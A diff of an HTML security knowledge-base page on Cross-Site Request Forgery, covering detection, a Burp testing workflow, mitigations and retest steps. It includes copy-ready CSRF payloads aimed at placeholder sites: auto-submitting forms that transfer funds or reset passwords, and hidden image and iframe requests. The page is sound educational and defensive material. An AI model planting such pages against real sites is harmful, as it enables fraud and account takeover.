@@ -3,159 +3,288 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>CSRF | Web Security | Saikumar Raju</title>
+  <title>CSRF | Saikumar Infosec</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+  <link rel="stylesheet" href="../core/styles/core.css">
   <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-    :root { --primary: #00f5a0; --bg-dark: #0a0c10; --bg-card: #111827; --bg-elevated: #1a1f2e; --text-primary: #e8edf5; --text-secondary: #9ca3af; --border: #1f2937; }
-    body.light { --bg-dark: #f3f4f6; --bg-card: #ffffff; --bg-elevated: #e5e7eb; --text-primary: #111827; --text-secondary: #4b5563; --border: #d1d5db; }
-    body { font-family: 'Inter', sans-serif; background: var(--bg-dark); color: var(--text-primary); line-height: 1.6; transition: all 0.3s ease; }
-    .container { max-width: 1300px; margin: 0 auto; padding: 0 2rem; }
-    .navbar { position: sticky; top: 0; background: var(--bg-dark); border-bottom: 1px solid var(--border); padding: 1rem 0; z-index: 100; backdrop-filter: blur(8px); }
-    .nav-flex { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; }
-    .logo { font-size: 1.5rem; font-weight: 700; text-decoration: none; color: var(--text-primary); }
-    .logo span { color: var(--primary); }
-    .nav-links { display: flex; gap: 2rem; list-style: none; align-items: center; flex-wrap: wrap; }
-    .nav-links a { text-decoration: none; color: var(--text-secondary); font-weight: 500; transition: color 0.2s; }
-    .nav-links a:hover { color: var(--primary); }
-    .theme-toggle { background: var(--bg-elevated); border: none; padding: 0.4rem 1rem; border-radius: 40px; cursor: pointer; color: var(--text-primary); display: flex; align-items: center; gap: 0.5rem; font-family: inherit; }
-    .mobile-menu { display: none; background: none; border: none; color: var(--text-primary); font-size: 1.5rem; cursor: pointer; }
-    .page-header { padding: 6rem 0 2rem; }
-    .breadcrumb { margin-bottom: 1rem; color: var(--text-secondary); font-size: 0.85rem; }
+    .page-header { padding: 4rem 0 2rem; }
+    .breadcrumb { margin-bottom: 1rem; color: var(--text-secondary); font-size: 0.85rem; display: flex; gap: 0.5rem; }
     .breadcrumb a { color: var(--primary); text-decoration: none; }
-    .page-header h1 { font-size: 2.5rem; font-weight: 700; margin-bottom: 0.5rem; }
-    .severity-badge { display: inline-block; background: rgba(255, 193, 7, 0.2); color: #ffc107; padding: 0.3rem 1rem; border-radius: 40px; font-size: 0.75rem; font-weight: 600; margin-bottom: 1rem; }
+    .severity-badge { display: inline-block; padding: 0.5rem 1rem; border-radius: 40px; font-size: 0.75rem; font-weight: 600; margin-bottom: 1rem; }
+    .severity-medium { background: rgba(255, 187, 0, 0.2); color: #ffbb00; }
+    .meta-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 1rem; margin: 1.5rem 0; padding: 1rem; background: var(--bg-card); border: 1px solid var(--border); border-radius: 0.75rem; }
+    .meta-item { padding: 0.5rem; }
+    .meta-item strong { display: block; color: var(--primary); margin-bottom: 0.25rem; font-size: 0.7rem; text-transform: uppercase; }
+    .meta-item span { color: var(--text-secondary); font-size: 0.85rem; }
     .content-section { margin: 2rem 0; }
-    .content-section h2 { font-size: 1.5rem; margin: 1.5rem 0 1rem; color: var(--primary); border-left: 3px solid var(--primary); padding-left: 1rem; }
-    .code-block { background: var(--bg-card); border: 1px solid var(--border); border-radius: 0.75rem; padding: 1.2rem; margin: 1.5rem 0; overflow-x: auto; font-family: 'Courier New', monospace; font-size: 0.85rem; color: var(--primary); position: relative; }
-    .copy-btn { position: absolute; top: 0.5rem; right: 0.5rem; background: var(--bg-elevated); border: none; padding: 0.2rem 0.5rem; border-radius: 4px; cursor: pointer; color: var(--text-secondary); font-size: 0.7rem; }
+    .content-section h2 { font-size: 1.4rem; margin: 2rem 0 1rem; color: var(--primary); border-left: 3px solid var(--primary); padding-left: 1rem; }
+    .content-section p, .content-section ul, .content-section ol { color: var(--text-secondary); line-height: 1.7; margin: 0.75rem 0; padding-left: 1.5rem; }
+    .content-section li { margin: 0.5rem 0; }
+    .content-section code { background: var(--bg-elevated); padding: 2px 6px; border-radius: 4px; color: var(--primary); font-family: monospace; }
+    .code-block { background: var(--bg-card); border: 1px solid var(--border); border-radius: 0.75rem; padding: 1.2rem; margin: 1.5rem 0; overflow-x: auto; font-family: monospace; font-size: 0.8rem; color: var(--primary); position: relative; }
+    .code-block pre { margin: 0; white-space: pre-wrap; }
+    .copy-btn { position: absolute; top: 0.5rem; right: 0.5rem; background: var(--bg-elevated); border: 1px solid var(--border); padding: 0.4rem 0.8rem; border-radius: 4px; cursor: pointer; color: var(--text-secondary); font-size: 0.75rem; }
     .copy-btn:hover { color: var(--primary); }
-    .vulnerability-box { background: rgba(255, 193, 7, 0.1); border-left: 4px solid #ffc107; padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .payload-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 0.8rem; margin: 1rem 0; }
+    .payload-item { background: var(--bg-elevated); border: 1px solid var(--border); border-radius: 0.5rem; padding: 0.8rem; font-family: monospace; font-size: 0.72rem; word-break: break-all; }
+    .payload-category { margin: 2rem 0 1rem; padding: 0.75rem 1rem; background: var(--bg-card); border-left: 3px solid var(--primary); font-weight: 600; color: var(--primary); }
+    .vulnerability-box { background: rgba(255, 187, 0, 0.1); border-left: 4px solid #ffbb00; padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .vulnerability-box strong { color: #ffbb00; }
     .mitigation-box { background: rgba(0, 245, 160, 0.1); border-left: 4px solid var(--primary); padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .mitigation-box strong { color: var(--primary); }
+    table { width: 100%; border-collapse: collapse; margin: 1.5rem 0; }
+    th, td { padding: 0.75rem; border: 1px solid var(--border); text-align: left; }
+    th { background: var(--bg-elevated); color: var(--primary); }
+    td { color: var(--text-secondary); }
     .back-link { display: inline-flex; align-items: center; gap: 0.5rem; margin-top: 2rem; color: var(--primary); text-decoration: none; }
-    footer { text-align: center; padding: 2rem; border-top: 1px solid var(--border); color: var(--text-secondary); font-size: 0.8rem; }
-    @media (max-width: 768px) { .container { padding: 0 1rem; } .mobile-menu { display: block; } .nav-links { display: none; width: 100%; flex-direction: column; padding: 1rem 0; gap: 1rem; } .nav-links.show { display: flex; } .page-header h1 { font-size: 1.8rem; } }
+    .tool-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 1rem; margin: 1rem 0; }
+    .tool-card { background: var(--bg-card); border: 1px solid var(--border); border-radius: 0.75rem; padding: 1rem; }
+    .tool-card h4 { color: var(--primary); margin-bottom: 0.5rem; }
+    .tool-card p { font-size: 0.8rem; margin: 0; }
+    .reference-link { color: var(--primary); text-decoration: none; }
+    @media (max-width: 768px) { .payload-grid { grid-template-columns: 1fr; } }
   </style>
 </head>
 <body>
 
 <nav class="navbar">
   <div class="container nav-flex">
-    <a href="../index.html" class="logo">Saikumar.<span>Raju</span></a>
+    <a href="../index.html" class="logo">Saikumar<span>.Infosec</span></a>
     <button class="mobile-menu" id="mobileMenuBtn"><i class="fas fa-bars"></i></button>
     <ul class="nav-links" id="navLinks">
-      <li><a href="../index.html">Resume</a></li>
-      <li><a href="../knowledge-base.html">Knowledge Base</a></li>
-      <li><a href="../blog.html">Write-ups</a></li>
-      <li><a href="../tools.html">Tools</a></li>
-      <li><a href="../index.html#contact">Contact</a></li>
-      <li><button class="theme-toggle" id="themeToggle"><i class="fas fa-moon"></i> Dark</button></li>
+      <li><a href="../index.html">Home</a></li>
+      <li><a href="../index.html">Home</a></li>
+      
+      <li><button class="theme-toggle" id="themeToggle"><i class="fas fa-moon"></i> <span>Dark</span></button></li>
     </ul>
   </div>
 </nav>
 
 <main>
   <div class="container">
-    <div class="breadcrumb"><a href="../knowledge-base.html">Knowledge Base</a> / <a href="index.html">Web Security</a> / CSRF</div>
+    <div class="breadcrumb"><a href="../index.html">Home</a> / <a href="index.html">Web Security</a> / CSRF</div>
+
     <div class="page-header">
-      <span class="severity-badge"><i class="fas fa-exclamation-triangle"></i> Medium Severity | OWASP A01:2021</span>
-      <h1>📌 Cross-Site Request Forgery (CSRF)</h1>
+      <span class="severity-badge severity-medium"><i class="fas fa-exclamation-triangle"></i> Medium Severity | OWASP A01:2021</span>
+      <h1>🟡 Cross-Site Request Forgery (CSRF)</h1>
+      <div class="meta-grid">
+        <div class="meta-item"><strong>CWE</strong><span>CWE-352: CSRF</span></div>
+        <div class="meta-item"><strong>OWASP</strong><span>A01:2021 Broken Access Control</span></div>
+        <div class="meta-item"><strong>CVSS 3.1</strong><span>6.5 (Medium)</span></div>
+        <div class="meta-item"><strong>CAPEC</strong><span>CAPEC-62, 111</span></div>
+        <div class="meta-item"><strong>Attack Vector</strong><span>Network</span></div>
+        <div class="meta-item"><strong>Privilege Required</strong><span>User Session</span></div>
+      </div>
     </div>
 
-    <div class="content-section">
+    <!-- 1. DESCRIPTION -->
+    <div class="content-section" id="description">
       <h2>🧠 Description</h2>
       <p><strong>What is CSRF?</strong></p>
-      <p>Cross-Site Request Forgery is an attack that forces an authenticated user to perform unintended actions on a web application. The attacker tricks the victim into clicking a malicious link or visiting a crafted page.</p>
+      <p>Cross-Site Request Forgery (CSRF) forces authenticated users to perform unwanted actions on a web application. The attacker cannot see the response, but can trigger state-changing actions.</p>
+      <div class="vulnerability-box">
+        <strong>CSRF allows attackers to:</strong>
+        <ul>
+          <li>Change user password</li>
+          <li>Transfer funds</li>
+          <li>Modify account settings</li>
+          <li>Delete data</li>
+          <li>Make purchases</li>
+        </ul>
+      </div>
     </div>
 
-    <div class="content-section">
-      <h2>🎯 Attack Surface</h2>
+    <!-- 2. CLASSIFICATION -->
+    <div class="content-section" id="classification">
+      <h2>🏷️ Classification</h2>
       <ul>
-        <li>✅ State-changing requests (POST, PUT, DELETE)</li>
-        <li>✅ Password/email change forms</li>
-        <li>✅ Money transfer endpoints</li>
-        <li>✅ Admin action endpoints</li>
+        <li><strong>Type:</strong> Cross-Site Request Forgery (CWE-352)</li>
+        <li><strong>OWASP:</strong> A01:2021 - Broken Access Control</li>
+        <li><strong>Types:</strong> GET-based CSRF, POST-based CSRF, Stored CSRF</li>
       </ul>
     </div>
 
-    <div class="content-section">
-      <h2>💣 CSRF Proof of Concept</h2>
-      <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button>
-        <pre>&lt;html&gt;
-&lt;body&gt;
-&lt;form action="https://target.com/change-password" method="POST"&gt;
-  &lt;input type="hidden" name="password" value="hacked" /&gt;
-  &lt;input type="submit" value="Click me" /&gt;
-&lt;/form&gt;
-&lt;script&gt;document.forms[0].submit();&lt;/script&gt;
-&lt;/body&gt;
-&lt;/html&gt;</pre>
-      </div>
-
-      <div class="payload-category">📧 Hidden Image/Iframe CSRF</div>
-      <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button>
-        <pre>&lt;img src="https://target.com/transfer?amount=1000&to=attacker" style="display:none" /&gt;
-&lt;iframe src="https://target.com/delete-account" style="display:none"&gt;&lt;/iframe&gt;</pre>
-      </div>
-
-      <div class="payload-category">📡 JSON CSRF (If Content-Type is lax)</div>
-      <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button>
-        <pre>&lt;form action="https://target.com/api/user" method="POST" enctype="text/plain"&gt;
-&lt;input name='{"role":"admin"}' value='' type='hidden' /&gt;
-&lt;/form&gt;</pre>
-      </div>
+    <!-- 3. ATTACK SURFACE -->
+    <div class="content-section" id="attack-surface">
+      <h2>🎯 Attack Surface</h2>
+      <ul>
+        <li>✅ User profile updates</li>
+        <li>✅ Password change forms</li>
+        <li>✅ Money transfers</li>
+        <li>✅ Email settings</li>
+        <li>✅ Delete operations</li>
+      </ul>
     </div>
 
-    <div class="content-section">
-      <h2>⚙️ Exploitation Steps</h2>
+    <!-- 4. PRECONDITIONS -->
+    <div class="content-section" id="preconditions">
+      <h2>⚠️ Preconditions</h2>
+      <ul>
+        <li>User is authenticated</li>
+        <li>No CSRF token on requests</li>
+        <li>Session cookies not protected</li>
+        <li>Attacker can trick user to visit malicious page</li>
+      </ul>
+    </div>
+
+    <!-- 5. DETECTION -->
+    <div class="content-section" id="detection">
+      <h2>🔍 Detection</h2>
+      <ul>
+        <li>Check if forms have CSRF tokens</li>
+        <li>Test state-changing actions without tokens</li>
+        <li>Check SameSite cookie attribute</li>
+      </ul>
+    </div>
+
+    <!-- 6. BURP WORKFLOW -->
+    <div class="content-section" id="burp-workflow">
+      <h2>🔧 Burp Suite Workflow</h2>
       <ol>
-        <li>Identify state-changing request (no CSRF token)</li>
-        <li>Create HTML form replicating the request</li>
-        <li>Host on attacker-controlled domain</li>
-        <li>Trick victim into visiting the page</li>
+        <li>Capture a state-changing request</li>
+        <li>Remove CSRF token parameter</li>
+        <li>Replay request without token</li>
+        <li>If succeeds - vulnerable to CSRF</li>
       </ol>
     </div>
 
-    <div class="content-section">
+    <!-- 7. TOOL AUTOMATION -->
+    <div class="content-section" id="tool-automation">
+      <h2>⚙️ Tool Automation</h2>
+      <div class="tool-grid">
+        <div class="tool-card"><h4>CSRF Scanner</h4><p>Burp CSRF Scanner</p></div>
+        <div class="tool-card"><h4>OWASP ZAP</h4><p>CSRF detection</p></div>
+      </div>
+    </div>
+
+    <!-- 8. BASIC PAYLOADS -->
+    <div class="content-section" id="payloads-basic">
+      <h2>💣 Basic Payloads</h2>
+      <div class="payload-category">🔧 GET-based CSRF</div>
+      <div class="payload-grid">
+        <div class="payload-item">&lt;img src="http://target.com/change-email?new=test@attacker.com"&gt;</div>
+        <div class="payload-item">&lt;script&gt;window.location='http://target.com/delete?id=123'&lt;/script&gt;</div>
+      </div>
+      <div class="payload-category">🔧 POST-based CSRF</div>
+      <div class="payload-grid">
+        <div class="payload-item">&lt;form action="http://target.com/transfer" method="POST"&gt;&lt;input type="hidden" name="to" value="attacker"&gt;&lt;input type="hidden" name="amount" value="10000"&gt;&lt;/form&gt;</div>
+      </div>
+    </div>
+
+    <div class="content-section" id="poc">
+      <h2>📝 Proof of Concept</h2>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+<pre># Malicious page hosted by attacker
+&lt;html&gt;
+&lt;body&gt;
+&lt;form action="https://bank.com/transfer" method="POST" id="csrf"&gt;
+&lt;input type="hidden" name="to" value="attacker"&gt;
+&lt;input type="hidden" name="amount" value="10000"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.getElementById('csrf').submit();&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre>
+      </div>
+    </div>
+
+    <div class="content-section" id="impact">
+      <h2>💥 Impact Analysis</h2>
+      <div class="vulnerability-box">
+        <strong>Severity: MEDIUM (CVSS 6.5)</strong>
+        <ul>
+          <li>Account takeover</li>
+          <li>Unauthorized transactions</li>
+          <li>Data modification</li>
+          <li>Reputation damage</li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="content-section" id="mitigation">
       <h2>🛡️ Mitigation</h2>
       <div class="mitigation-box">
-        <strong>✅ CSRF Tokens:</strong> Unique, unpredictable tokens per session/request<br>
-        <strong>✅ SameSite Cookies:</strong> Set SameSite=Lax or SameSite=Strict<br>
-        <strong>✅ Custom Headers:</strong> Require custom headers (e.g., X-Requested-With)<br>
-        <strong>✅ Re-authentication:</strong> Require password for critical actions<br>
-        <strong>✅ CAPTCHA:</strong> For sensitive operations
+        <strong>✅ CSRF Tokens:</strong> Use anti-CSRF tokens on all state-changing requests<br><br>
+        <strong>✅ SameSite Cookies:</strong> Set SameSite=Strict or Lax<br><br>
+        <strong>✅ Referer Validation:</strong> Validate Origin/Referer headers
       </div>
     </div>
 
-    <div class="content-section">
-      <h2>⚠️ Risk / Impact</h2>
-      <div class="vulnerability-box">
-        <strong>Severity: Medium</strong><br><br>
-        <strong>Impact:</strong> Account takeover, password change, money transfer, data deletion
+    <div class="content-section" id="advanced-mitigation">
+      <h2>🏰 Advanced Mitigation</h2>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+<pre># Set SameSite cookie
+Set-Cookie: session=abc; SameSite=Strict; Secure
+
+# Use SameSite=Strict or SameSite=Lax</pre>
       </div>
     </div>
 
-    <div class="content-section">
-      <h2>📚 References</h2>
+    <div class="content-section" id="monitoring">
+      <h2>📊 Monitoring & Detection</h2>
       <ul>
-        <li><a href="https://portswigger.net/web-security/csrf" class="reference-link" target="_blank">PortSwigger: CSRF</a></li>
-        <li><a href="https://owasp.org/www-community/attacks/csrf" class="reference-link" target="_blank">OWASP: CSRF</a></li>
+        <li>Monitor for CSRF token validation failures</li>
+        <li>Alert on requests without proper tokens</li>
       </ul>
     </div>
+
+    <div class="content-section" id="security-controls">
+      <h2>🔐 Security Controls</h2>
+      <table>
+        <thead><tr><th>Control</th><th>Implementation</th></tr></thead>
+        <tbody>
+          <tr><td>CSRF Token</td><td>Per-request or per-session tokens</td></tr>
+          <tr><td>SameSite Cookies</td><td>Set SameSite=Strict</td></tr>
+          <tr><td>Custom Header</td><td>Require custom header for API</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <div class="content-section" id="bypass-techniques">
+      <h2>🔓 Bypass Techniques</h2>
+      <div class="payload-grid">
+        <div class="payload-item">Session fixation</div>
+        <div class="payload-item">Cross-site scripting to steal token</div>
+        <div class="payload-item">Clickjacking combined with CSRF</div>
+      </div>
+    </div>
+
+    <div class="content-section" id="tools-commands">
+      <h2>🛠️ Tools</h2>
+      <div class="tool-grid">
+        <div class="tool-card"><h4>Burp CSRF Scanner</h4><p>Auto-detect CSRF</p></div>
+        <div class="tool-card"><h4>CSRF PoC Generator</h4><p>Generate attack pages</p></div>
+      </div>
+    </div>
+
+    <div class="content-section" id="references">
+      <h2>📚 References</h2>
+      <ul>
+        <li><a href="https://owasp.org/www-community/attacks/csrf" class="reference-link">OWASP: CSRF</a></li>
+        <li><a href="https://portswigger.net/web-security/csrf" class="reference-link">PortSwigger: CSRF</a></li>
+      </ul>
+    </div>
+
+    <div class="content-section" id="retest-steps">
+      <h2>🔄 Retest Steps</h2>
+      <table><thead><tr><th>Step</th><th>Action</th></tr></thead><tbody><tr><td>1</td><td>Add CSRF tokens</td></tr><tr><td>2</td><td>Re-test without token</td></tr><tr><td>3</td><td>Verify SameSite cookie</td></tr></tbody></table>
+    </div>
+
+    <div class="content-section" id="detection-logic"><h2>⚙️ Detection Logic</h2><p>Check for CSRF token presence, validate SameSite attribute.</p></div>
+    <div class="content-section" id="threat-hunting"><h2>🔎 Threat-Hunting</h2><p>IOCs: CSRF tokens missing, no SameSite attribute.</p></div>
+    <div class="content-section" id="defensive-detection"><h2>🛡️ Defensive</h2><p>Browser-level protection, CSP directives.</p></div>
 
     <a href="index.html" class="back-link"><i class="fas fa-arrow-left"></i> Back to Web Security</a>
   </div>
 </main>
 
-<footer><p>Saikumar Raju — Cybersecurity Consultant | CSRF - Complete Guide</p></footer>
+<footer class="footer"><div class="container"><p>Saikumar Raju | Offensive Security Knowledge Base</p></div></footer>
 
 <script>
-  const mobileBtn = document.getElementById('mobileMenuBtn');
-  const navLinks = document.getElementById('navLinks');
-  if (mobileBtn) { mobileBtn.addEventListener('click', () => navLinks.classList.toggle('show')); }
-  const themeToggle = document.getElementById('themeToggle'); if (themeToggle) { themeToggle.addEventListener('click', () => { document.body.classList.toggle('light'); const icon = themeToggle.querySelector('i'); if (document.body.classList.contains('light')) { icon.classList.remove('fa-moon'); icon.classList.add('fa-sun'); themeToggle.innerHTML = '<i class="fas fa-sun"></i> Light'; } else { icon.classList.remove('fa-sun'); icon.classList.add('fa-moon'); themeToggle.innerHTML = '<i class="fas fa-moon"></i> Dark'; } }); }
-  function copyCode(btn) { const code = btn.parentElement.querySelector('pre').innerText; navigator.clipboard.writeText(code); btn.innerText = 'Copied!'; setTimeout(() => { btn.innerText = 'Copy'; }, 2000); }
+document.addEventListener('DOMContentLoaded',function(){var m=document.getElementById('mobileMenuBtn'),n=document.getElementById('navLinks');if(m)m.addEventListener('click',function(){n.classList.toggle('show')});var t=document.getElementById('themeToggle');if(t)t.addEventListener('click',function(){document.body.classList.toggle('light');var i=t.querySelector('i'),s=t.querySelector('span');i.className=document.body.classList.contains('light')?'fas fa-sun':'fas fa-moon';s.textContent=document.body.classList.contains('light')?'Light':'Dark'})});
+function copyCode(b){navigator.clipboard.writeText(b.parentElement.querySelector('pre').innerText);b.textContent='Copied!';setTimeout(function(){b.textContent='Copy'},2000);}
 </script>
 </body>
 </html>
